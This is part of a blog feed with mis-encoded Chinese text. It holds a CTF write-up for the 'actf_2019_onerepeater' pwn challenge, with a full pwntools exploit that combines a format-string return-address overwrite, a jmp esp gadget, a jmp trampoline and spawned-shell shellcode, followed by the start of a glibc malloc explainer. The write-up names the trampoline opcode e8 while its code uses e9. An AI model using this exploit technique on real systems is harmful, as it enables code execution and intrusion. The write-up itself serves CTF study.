        <content type="html"><![CDATA[<p>buuåˆ·é¢˜è®°å½•ï¼Œ<a href="https://buuoj.cn/challenges#actf_2019_onerepeater">actf_2019_onerepeater</a></p><span id="more"></span><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>æ‹¿åˆ°elfæ–‡ä»¶<code>checksec</code>ä¸€æ³¢ï¼Œæ— ä»»ä½•ä¿æŠ¤ï¼Œæ ˆå¯æ‰§è¡Œï¼Œé‚£ä¹ˆå¤šåŠæ˜¯è¦æŠŠç¨‹åºæµåŠ«æŒåˆ°æ ˆä¸Šæ‰§è¡Œ<code>shellcode</code>äº†ï¼Œæ‹–è¿›idaé‡Œé¢ã€‚</p><p><img src="/2022/02/02/actf_2019_onerepeater%20writeup/1.png" alt="1"></p><p>é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œèœå•é¢˜ï¼Œç„¶åé€‰é¡¹2æ˜¯æ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œ1é€‰é¡¹å°±æ˜¯è¯»å…¥<code>0x400</code>å­—èŠ‚çš„æ•°æ®ã€‚é¦–å…ˆæ‰¾åˆ°<code>jmp esp</code>çš„<code>gadget</code>ã€‚</p><p><img src="/2022/02/02/actf_2019_onerepeater%20writeup/2.png" alt="2"></p><p>æœ‰å°±å¾ˆå¥½åŠäº†ï¼Œåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ”¹æ‰è¿”å›åœ°å€ä¸ºè¿™ä¸ªgadgetï¼Œç„¶åå†åœ¨åé¢å†™ä¸€ä¸ªè·³æ¿æŒ‡ä»¤è·³åˆ°ç¼“å†²åŒºå†…ï¼Œåªè¦åœ¨é€€å‡ºä¹‹å‰æŠŠç¼“å†²åŒºå†™ä¸Šshellcodeå°±å¯ä»¥å¾ˆå¿«<code>get shell</code>äº†ã€‚</p><p>å…ˆé€šè¿‡æµ‹è¯•åç§»ï¼Œå‘ç°bufåœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°çš„ç¬¬16ä¸ªå‚æ•°ã€‚</p><p><img src="/2022/02/02/actf_2019_onerepeater%20writeup/3.png" alt="3"></p><p>é‚£ä¹ˆæˆ‘ä»¬å…ˆæŠŠè¿”å›åœ°å€åŠ«æŒäº†å†è¯´ï¼Œç»è¿‡è°ƒè¯•å‘ç°è¿”å›åœ°å€åœ¨buf+0x41cçš„ä½ç½®ä¸Šã€‚</p><p>å†™å‡ºéƒ¨åˆ†exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">jmp_esp=<span class="number">0x08048907</span><span class="comment"># : jmp esp</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    byte=jmp_esp&amp;<span class="number">0xff</span></span><br><span class="line">    jmp_esp&gt;&gt;=<span class="number">8</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    x=p.recvline()</span><br><span class="line">    stack=<span class="built_in">int</span>(x,<span class="number">16</span>)</span><br><span class="line">    success(<span class="string">&#x27;stack:&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">    payload=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(byte).encode()+<span class="string">b&#x27;c%24$hhn&#x27;</span>).ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\0&#x27;</span>)+p32(stack+<span class="number">0x41c</span>+i)</span><br><span class="line"><span class="comment">#print(payload)</span></span><br><span class="line"><span class="comment">#print(hex(len(payload)))</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="éƒ¨åˆ†æ±‡ç¼–çŸ¥è¯†"><a href="#éƒ¨åˆ†æ±‡ç¼–çŸ¥è¯†" class="headerlink" title="éƒ¨åˆ†æ±‡ç¼–çŸ¥è¯†"></a>éƒ¨åˆ†æ±‡ç¼–çŸ¥è¯†</h2><p>è¿™é‡Œéœ€è¦è®²ä¸€è®²æ±‡ç¼–çš„çŸ¥è¯†äº†ï¼Œå› ä¸ºæˆ‘ä»¬åœ¨<code>jmp esp</code>çš„æ—¶å€™<code>esp</code>æ˜¯æŒ‡å‘æˆ‘ä»¬è¿”å›åœ°å€çš„åé¢ä¸€æ ¼ï¼Œæ‰€ä»¥<code>eip</code>ç­‰ä¼šä¼šæŒ‡å‘<code>ret_addr+4</code>çš„ä½ç½®ä¸Šï¼Œé‚£ä¹ˆè¿™ä¸ªä½ç½®æˆ‘ä»¬å†™äº›ä»€ä¹ˆå‘¢ï¼Œå½“ç„¶ç›´æ¥å†™<code>shellcode</code>æ˜¯è‚¯å®šæ²¡é—®é¢˜çš„ï¼Œå®é™…æ“ä½œä¹Ÿä¸ä¼šå¤ªéš¾ï¼Œä¸€ä¸ªå¾ªç¯è§£å†³ï¼Œä½†æ˜¯å½“å¤æ‚èµ·æ¥çš„æ—¶å€™è¿™ä¸ªå°±æœ‰ç‚¹éš¾ï¼Œæ‰€ä»¥å†éœ€è¦ä¸€ä¸ªè·³æ¿æŒ‡ä»¤æ‰§è¡Œ<code>jmp buf</code>ï¼Œè¿™é‡Œæˆ‘ä»¬è®²è®²<code>jmp</code>çš„å®ç°ï¼Œ<code>jmp</code>çš„ç¼–ç æ˜¯<code>5</code>ä¸ªå­—èŠ‚ï¼Œå…¶å®æœ‰åˆ†å¤§è·³å°è·³ï¼Œå°è·³åªè¦ä¸¤ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯åªèƒ½è·³å‰å<code>0x7f</code>ä»¥å†…çš„ä½ç½®ã€‚è¿™é‡Œè¦è·³åˆ°<code>buf</code>æ˜¾ç„¶è¦ç”¨å¤§è·³äº†ï¼Œå¤§è·³çš„ç¼–ç æ˜¯<code>e8</code> åé¢è·Ÿä¸Šå°ç«¯çš„<code>int</code>å­—èŠ‚åºã€‚è¿™ä¸ª<code>int</code>å­—èŠ‚å‘¢ä»£è¡¨åç§»ã€‚</p><p>å¹³æ—¶æˆ‘ä»¬çœ‹åˆ°çš„<code>jmp 0x400689</code>è¿™äº›å®é™…ç¼–ç éƒ½ä¸æ˜¯è¿™æ ·å­ç¼–ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e8 89 06 40 00</span><br></pre></td></tr></table></figure><p>è€Œæ˜¯ä¼šæ ¹æ®è¿™ä¸ªæŒ‡ä»¤æ‰€å¤„çš„ä½ç½®ï¼Œç„¶åè®¡ç®—ä¸‹ä¸€æ¡æŒ‡ä»¤åˆ°æˆ‘è¦è·³è½¬çš„æŒ‡ä»¤ä½ç½®çš„æ•°å€¼ä½œä¸ºjmpçš„å‚æ•°ã€‚</p><p>ä¸¾ä¸ªä¾‹å­ï¼Œå‡å¦‚è¿™ä¸ªjmp 0x400689æ‰€å¤„çš„ä½ç½®æ˜¯0x400500ã€‚é‚£ä¹ˆå®ƒçš„ç¼–ç å°†æ˜¯</p><p>0x400689-(0x400500+5)=0x134</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e8 34 01 00 00</span><br></pre></td></tr></table></figure><p>è¿™æ ·å­å¾—åˆ°çš„ã€‚</p><p>å¦‚æœæ˜¯å¾€ä½åœ°å€è·³é‚£å°±ç”¨è´Ÿæ•°è¡¨ç¤ºã€‚</p><p>è¿™é‡Œå‘¢æˆ‘ä»¬è¦å¾€<code>buf</code>è·³ï¼Œä¹Ÿå°±æ˜¯ä½åœ°å€è·³è½¬ï¼Œé‚£ä¹ˆæˆ‘ä»¬æŒ‡ä»¤çš„ä½ç½®æ˜¯<code>buf+0x420</code>ï¼Œæ‰€ä»¥å¾—åˆ°åç§»<code>0x425</code>ï¼Œå› ä¸ºæŒ‡ä»¤é•¿åº¦å äº†äº”ä¸ªï¼Œè·³è½¬çš„èµ·å§‹ä½ç½®æ˜¯æ‰§è¡Œå®Œè¿™ä¸ªæŒ‡ä»¤çš„ä¸‹ä¸€ä¸ªä½ç½®ã€‚</p><p>å–è´Ÿæ•°å¾—åˆ°<code>0xfffffbdb</code>ã€‚</p><p>æˆ‘ä»¬å°±å¾—åˆ°äº†è·³æ¿æŒ‡ä»¤çš„ç¼–ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e8 db fb ff ff</span><br></pre></td></tr></table></figure><p>åŒæ ·åœ¨ä¸‹æ–¹éƒ¨ç½²è¿™äº›å­—èŠ‚ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">shellcode=<span class="string">b&#x27;\xe9\xdb\xfb\xff\xff&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    w=shellcode[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(w))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    x=p.recvline()</span><br><span class="line">    stack=<span class="built_in">int</span>(x,<span class="number">16</span>)</span><br><span class="line">    success(<span class="string">&#x27;stack:&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">    payload=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(w).encode()+<span class="string">b&#x27;c%24$hhn&#x27;</span>).ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\0&#x27;</span>)+p32(stack+<span class="number">0x420</span>+i)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæœ€åæŒ‡ä»¤å°±ä¼šè·³è½¬åˆ°<code>buf</code>ä¸Šï¼Œåœ¨é€‰æ‹©3ä¹‹å‰åœ¨<code>buf</code>ä¸Šå¡«ä¸€é<code>shellcode</code>å°±å®Œäº‹äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.send(asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Exit&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x80486FA\nb *0x80487C6&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="è¿è¡Œç»“æœ"><a href="#è¿è¡Œç»“æœ" class="headerlink" title="è¿è¡Œç»“æœ"></a>è¿è¡Œç»“æœ</h2><p><img src="/2022/02/02/actf_2019_onerepeater%20writeup/4.png" alt="4"></p><p>å¯ä»¥çœ‹åˆ°é€šè¿‡ä¸¤æ¬¡è·³è½¬ï¼Œç¨‹åºæˆåŠŸæ‰§è¡Œåˆ°äº†<code>shellcode</code>ï¼Œç„¶åå°±æ„‰å¿«çš„<code>cat flag</code> å§</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name,port=<span class="number">9999</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.23-64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,port)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.23-buu64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(<span class="number">1</span>,<span class="string">&#x27;./ACTF_2019_OneRepeater&#x27;</span>,port=<span class="number">26602</span>)</span><br><span class="line"></span><br><span class="line">jmp_esp=<span class="number">0x08048907</span><span class="comment"># : jmp esp</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    byte=jmp_esp&amp;<span class="number">0xff</span></span><br><span class="line">    jmp_esp&gt;&gt;=<span class="number">8</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    x=p.recvline()</span><br><span class="line">    stack=<span class="built_in">int</span>(x,<span class="number">16</span>)</span><br><span class="line">    success(<span class="string">&#x27;stack:&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">    payload=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(byte).encode()+<span class="string">b&#x27;c%24$hhn&#x27;</span>).ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\0&#x27;</span>)+p32(stack+<span class="number">0x41c</span>+i)</span><br><span class="line"><span class="comment">#print(payload)</span></span><br><span class="line"><span class="comment">#print(hex(len(payload)))</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">b&#x27;\xe9\xdb\xfb\xff\xff&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    w=shellcode[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(w))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    x=p.recvline()</span><br><span class="line">    stack=<span class="built_in">int</span>(x,<span class="number">16</span>)</span><br><span class="line">    success(<span class="string">&#x27;stack:&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">    payload=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(w).encode()+<span class="string">b&#x27;c%24$hhn&#x27;</span>).ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\0&#x27;</span>)+p32(stack+<span class="number">0x420</span>+i)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.send(asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.sendlineafter(&#x27;Exit&#x27;,b&#x27;3&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(shellcraft.sh())</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x80486FA\nb *0x80487C6&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mallocæºç åˆ†æ</title>
      <link href="/2022/01/27/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
      <url>/2022/01/27/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>å­¦äº†è¿™ä¹ˆä¹…å †æ¼æ´äº†ï¼Œæˆ‘æƒ³åº”è¯¥æŠŠ<code>glibc</code>çš„<code>malloc</code>å’Œ<code>free</code>æºç è§£æå†™ä¸€ä¸‹äº†ï¼Œå¸Œæœ›èƒ½å¸®åŠ©ä¸€ä¸‹åˆšä¸Šè·¯çš„å¸ˆå‚…ï¼ŒåŒæ—¶ä¹Ÿå·©å›ºä¸€ä¸‹è‡ªèº«çŸ¥è¯†ã€‚</p><span id="more"></span><h2 id="å†…å­˜åˆ†é…"><a href="#å†…å­˜åˆ†é…" class="headerlink" title="å†…å­˜åˆ†é…"></a>å†…å­˜åˆ†é…</h2><p>æˆ‘ä»¬å¹³æ—¶å†™ç¨‹åºçš„æ—¶å€™ï¼ŒæŸäº›å˜é‡å¯èƒ½éœ€è¦åœ¨å¼€å§‹å°±åˆ†é…å†…å­˜ï¼Œè¿™äº›å†…å­˜æ˜¯ä¸å¯é¿å…çš„ã€‚é‚£ä¹ˆè¿™äº›å†…å­˜å°±æ˜¯é™æ€åˆ†é…çš„ï¼Œå½“ç¨‹åºç¼–è¯‘å®Œæˆä¹‹åï¼Œå®ƒå°±ç¡®å®šäº†å ç”¨è¿™ä¹ˆå¤šçš„å†…å­˜ã€‚ä½†æ˜¯æœ‰æ—¶å€™ï¼Œå®é™…é—®é¢˜çš„è§„æ¨¡æ²¡æœ‰é¢„æœŸé‚£ä¹ˆå¤§ï¼Œæˆ‘ä»¬ä¸ä¸€å®šéœ€è¦å¾ˆå¤§çš„å†…å­˜ï¼Œå¦‚æœæ¯æ¬¡éƒ½æŒ‰æœ€å¤§è€ƒè™‘é‚£ä¹ˆå°±æœ‰å¾ˆå¤§ä¸€éƒ¨åˆ†å†…å­˜æ˜¯è¢«æµªè´¹çš„ï¼Œè¿™å°±æ˜¯é™æ€åˆ†é…å†…å­˜çš„å¼Šç«¯ï¼Œè™½ç„¶å’±æ‰“acmçš„æ—¶å€™éƒ½æ˜¯é™æ€åˆ†é…çš„ï¼Œä½†æ˜¯è¿™æ²¡å•¥ï¼Œå› ä¸ºæ¯ä¸ªé—®é¢˜ä¸è¦è¶…è¿‡å®ƒçš„æ€»å†…å­˜ä¸Šé™é—®é¢˜å°±ä¸å¤§(ç‹—å¤´ã€‚ä½†æ˜¯åœ¨å†…å­˜ä¸è¶³çš„å¹´ä»£ï¼Œå¦‚æœéƒ½è¿™æ ·ä½¿ç”¨é™æ€åˆ†é…å†…å­˜çš„æ–¹å¼ï¼Œé‚£ä¹ˆè®¡ç®—æœºçš„æ•ˆç‡ä¼šè¢«æ‹–å®å¾ˆå¤šï¼Œæ‰€ä»¥å°±æœ‰åŠ¨æ€åˆ†é…å†…å­˜çš„æ¦‚å¿µäº†ã€‚</p><p><code>glibc</code>é‡‡ç”¨<code>ptmalloc</code>çš„ç®¡ç†æ–¹å¼å»åˆ†é…å†…å­˜ã€‚</p><h2 id="ptmalloc2çš„åˆ†é…ç­–ç•¥"><a href="#ptmalloc2çš„åˆ†é…ç­–ç•¥" class="headerlink" title="ptmalloc2çš„åˆ†é…ç­–ç•¥"></a>ptmalloc2çš„åˆ†é…ç­–ç•¥</h2><p>é‚£ä¹ˆåŠ¨æ€åˆ†é…å†…å­˜è¦æ€ä¹ˆå»åˆ†é…å‘¢ï¼Ÿå¦‚æœæˆ‘ä»¬éœ€è¦å ç”¨é™¤äº†æˆ‘ç¨‹åºæœ¬èº«å ç”¨çš„å†…å­˜ä»¥å¤–çš„ä¸€å—å†…å­˜ï¼Œé‚£ç¨‹åºæŒ‡å®šæ˜¯æ²¡æƒé™ç”¨çš„ï¼Œå¾—å…ˆå‘æ“ä½œç³»ç»Ÿç”³è¯·è¿™ä¸€å—å†…å­˜çš„ä½¿ç”¨æƒã€‚è€Œæ“ä½œç³»ç»Ÿæ²¡é‚£ä¹ˆé—²ï¼Œåˆ†é…å‡ ä¸ªå­—èŠ‚çš„å†…å­˜éƒ½è¦å®ƒå»ç®¡ï¼Œæ“ä½œç³»ç»Ÿç®¡ç†éƒ½æ˜¯æŒ‰é¡µå¼çš„ç®¡ç†ã€‚è€Œä¸€é¡µçš„å†…å­˜æ˜¯<code>0x1000B</code>ï¼Œå¦‚æœæ¯ä¸€æ¬¡ç”³è¯·æˆ‘éƒ½å‘æ“ä½œç³»ç»Ÿç”³è¯·ï¼Œæ¯ä¸€æ¬¡å½’è¿˜éƒ½ç›´æ¥å½’è¿˜ç»™æ“ä½œç³»ç»Ÿé‚£ä¹ˆå¿…å®šä¼šå¢å¤§æ“ä½œç³»ç»Ÿçš„è´Ÿæ‹…ã€‚å› æ­¤åˆ†é…å†…å­˜çš„æ—¶å€™å¯ä»¥æŒ‰ç…§ä¸€ä¸ªç­–ç•¥å»åˆ†é…ï¼Œåˆ†é…ä¸€å®šå¾—å°½é‡é¿å…è¿‡å¤šåœ°ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨ï¼Œå½’è¿˜çš„æ—¶å€™å¯ä»¥ç­‰åˆ°ç¨‹åºç»“æŸæ—¶ä¸€å¹¶å½’è¿˜ï¼Œè¿™æ ·çš„è¯æ“ä½œç³»ç»Ÿçš„è´Ÿæ‹…å°±å¤§å¤§ä¸‹é™äº†ã€‚</p><p><code>ptmalloc2</code>çš„åˆ†é…æ–¹å¼ä¼šåœ¨ä½ ç¬¬ä¸€æ¬¡<code>malloc</code>çš„æ—¶å€™å‘æ“ä½œç³»ç»Ÿç”³è¯·<code>0x21000B(132KB)</code>çš„å†…å­˜ï¼Œç„¶ååç»­åˆ†é…å°±ä¸ä¼šå‘æ“ä½œç³»ç»Ÿç”³è¯·å†…å­˜ï¼Œåªæœ‰ç”¨å®Œäº†çš„æ—¶å€™æ‰ä¼šå†æ¬¡ç”³è¯·å†…å­˜ã€‚</p><p>æ“ä½œç³»ç»Ÿçš„é—®é¢˜è§£å†³äº†ä¹‹åæˆ‘ä»¬å†æ¥çœ‹çœ‹<code>glibc</code>æ€ä¹ˆå¤„ç†å…·ä½“çš„åˆ†é…ç»†èŠ‚ã€‚åˆ†é…çš„æ—¶å€™æˆ‘ä¸€å®šæ˜¯åˆ‡å‡ºä¸€å—ç‰¹å®šå¤§å°æ‰æ˜¯æœ€ä¼˜çš„ç­–ç•¥çš„ï¼Œæ¯”å¦‚ç¨‹åº<code>malloc(4)</code>ï¼Œé‚£æˆ‘æ¥åˆ‡ä¸ª4å­—èŠ‚çš„å†…å­˜ç»™å®ƒç”¨ï¼Œ<code>malloc(1)</code>é‚£å°±ç»™å®ƒä¸€å­—èŠ‚å»ä½¿ç”¨ã€‚ç„¶è€Œç°å®æ²¡æœ‰é‚£ä¹ˆç†æƒ³ï¼Œå› ä¸ºå¦‚æœæˆ‘åˆ‡ä¸‹æ¥çš„å—ç”¨æˆ·ç¨‹åºå®Œå…¨å¯å†™çš„è¯ï¼Œé‚£ä¹ˆæˆ‘æ€ä¹ˆåŒºåˆ†è¿™ä¸ªå†…å­˜å—æ˜¯å¦è¢«ä½¿ç”¨å‘¢ï¼Ÿç„¶åå†…å­˜å—çš„åˆ†ç•Œçº¿åˆå¦‚ä½•ç•Œå®šå‘¢ï¼Ÿæ‰€ä»¥åˆ†å‰²å†…å­˜å—çš„æ—¶å€™ä¸å¯é¿å…åœ°è¦åœ¨å†…å­˜å—ä¸­é¢å¤–å¼€å‡ºä¸€éƒ¨åˆ†åŒºåŸŸç”¨äºç®¡ç†ã€‚é‚£ä¹ˆå¯ä»¥åœ¨æ¯ä¸ªåˆ†é…çš„å†…å­˜å—åŠ ä¸Šä¸€ä¸ª<code>int</code>æ•°æ®ä½œä¸ºæ­¤å†…å­˜å—çš„<code>size</code>ï¼Œ64ä½çš„æ“ä½œç³»ç»Ÿå¯ä»¥ä½¿ç”¨<code>long long</code>ã€‚åŒç†ï¼Œä¸ºäº†ç®¡ç†æ–¹ä¾¿ï¼Œ<code>glibc</code>åœ¨åˆ†é…<code>chunk</code>çš„æ—¶å€™ä¹Ÿå¹¶ä¸æ˜¯åˆ†é…è¿™ä¹ˆå¤šå°±åªèƒ½å†™è¿™ä¹ˆå¤šçš„ã€‚å®ƒä¹Ÿä¸æƒ³é—²åˆ°å»ç®¡1å­—èŠ‚2å­—èŠ‚è¿™æ ·çš„å†…å­˜å—ã€‚è€Œä¸”å¦‚æœæœ‰è¿™æ ·çš„å†…å­˜å—ï¼Œé‚£ä¹ˆåœ¨åˆ†é…æŒ‡é’ˆçš„æ—¶å€™å†…å­˜æ²¡åŠæ³•å¯¹é½ä¼šå‡ºç°å¾ˆå¤šéº»çƒ¦çš„äº‹ã€‚æ‰€ä»¥åœ¨åˆ†é…å†…å­˜å—çš„æ—¶å€™ï¼Œæœ‰ä¸€ä¸ª<code>SIZE_SZ</code>ï¼Œä¸€æ¬¡åˆ†é…çš„å†…å­˜å¿…å®šæ˜¯<code>SIZE_SZ*2</code>çš„æ•´å€æ•°ï¼Œ<code>SIZE_SZ</code>åœ¨32ä½æ“ä½œç³»ç»Ÿä¸‹çš„å€¼æ˜¯<code>4</code>ï¼Œ64ä½çš„å€¼æ˜¯<code>8</code>ã€‚ä¸ºäº†æ–¹ä¾¿ï¼Œä»¥ä¸‹æŠŠå†…å­˜å—ç»Ÿä¸€å«<code>chunk</code>ã€‚</p><p>ä»¥32ä½æ“ä½œç³»ç»Ÿä¸ºä¾‹ï¼Œsizeçš„å€¼å¿…å®šä¸º8çš„æ•´æ•°å€ï¼ŒäºŒè¿›åˆ¶è§’åº¦ä¸‹çœ‹æ¥ï¼Œä½ä¸‰ä½æ°¸è¿œæ˜¯0ï¼Œè¿™æ ·æœ‰ç‚¹æµªè´¹äº†å†…å­˜ï¼Œå› æ­¤è§„å®š<code>size</code>çš„ä½ä¸‰ä½ä¸ä½œä¸ºå®é™…çš„<code>chunk</code>å¤§å°ï¼Œè€Œæ˜¯æ ‡å¿—ä½ã€‚ä¸‰ä¸ªæ ‡å¿—ä½ä»é«˜ä½åˆ°ä½ä½åˆ†åˆ«æ˜¯ï¼š</p><ol><li><code>NON_MAIN_ARENA</code>:æ˜¯å¦ä¸ºä¸»åˆ†é…ï¼Œ0è¡¨ç¤ºæ˜¯ä¸»åˆ†é…ï¼Œæƒå€¼ä¸º4</li><li><code>IS_MMAPPED</code>:è¡¨ç¤ºå†…å­˜æ˜¯å¦ä¸º<code>mmap</code>è·å¾—ï¼Œ0è¡¨ç¤ºä¸æ˜¯ï¼Œæƒå€¼ä¸º2</li><li><code>PREV_INUSE</code>:è¡¨ç¤ºå‰é¢ä¸€ä¸ªå†…å­˜å—æ˜¯å¦è¢«ä½¿ç”¨ï¼Œ0è¡¨ç¤ºä¸è¢«ä½¿ç”¨ï¼Œæƒå€¼ä¸º1</li></ol><p>åœ¨64ä½æ“ä½œç³»ç»Ÿä¸­ï¼Œå¤šå‡ºä¸€ä¸ªæ ‡å¿—ä½ï¼Œä½†æ˜¯è¿™ä¸ªæ ‡å¿—ä½æ— ä»»ä½•æ„ä¹‰ï¼Œå¯èƒ½åç»­ä¼šèµ‹äºˆåˆ«çš„æ„ä¹‰ï¼Œä½†æ˜¯å®ƒä¸€æ 